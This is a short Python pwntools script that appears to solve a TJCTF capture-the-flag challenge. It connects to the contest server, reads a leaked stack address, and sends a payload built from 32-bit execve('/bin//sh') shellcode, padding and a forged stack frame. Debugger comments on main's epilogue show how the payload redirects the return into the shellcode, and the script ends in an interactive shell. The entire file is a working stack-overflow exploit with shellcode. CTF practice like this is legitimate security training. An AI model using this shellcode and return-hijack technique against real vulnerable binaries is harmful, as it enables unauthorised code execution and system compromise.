from pwn import *

sh=remote("p1.tjctf.org",8011)
#sh=process("./start")

sh.recvuntil("hint: ")
data=int(sh.recv(),16)
shell = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
pan=len(shell)
p= shell				# shell code
p+= 'a'*(44-pan-12)		# padding
p+= p32(data+48)		# 0xffffd2c0
p+= '\x00'*8			# 0xffffd2c4 & 0xffffd2c8
p+= p32(data)			# return to shellcode

# 0x565556ab <main+158>       pop    ecx 			# data + 48
# 0x565556ac <main+159>       pop    ebx 			# \x00
# 0x565556ad <main+160>       pop    ebp			# \x00
# 0x565556ae <main+161>       lea    esp, [ecx-0x4] # [0xffffd2d0 - 0x4] = 0xffffd2d0
# 0x565556b1 <main+164>       ret 

# 0xffffd2c0│+0x0000: data+48 (0xffffd2d0) ← $esp
# 0xffffd2c4│+0x0004: 0x00000000
# 0xffffd2c8│+0x0008: 0x00000000   ← $ebp
# 0xffffd2cc│+0x000c: data
# 0xffffd2d0│+0x0010: 0xf7fb2000  →  0x001dfd6c

log.info(hex(data))
log.info(pan)
log.info(p)

sh.sendline(p)
sh.interactive()